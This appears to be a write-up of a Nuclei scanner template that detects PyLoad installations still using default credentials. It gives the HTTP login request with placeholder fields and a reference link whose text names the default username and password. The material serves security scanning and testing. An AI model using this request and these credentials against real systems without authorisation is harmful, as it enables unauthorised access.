# Nuclei Template: PyLoad Default Login
**Template ID:** pyload-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`pyload-default-login.yaml`)

## Vulnerability Information & PoC

## Description
PyLoad Default Credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

do=login&username={{username}}&password={{password}}&submit=Login
```

## References
- https://pypi.org/project/pyload-ng/#:~:text=Default%20username%3A%20pyload%20.,Default%20password%3A%20pyload%20.
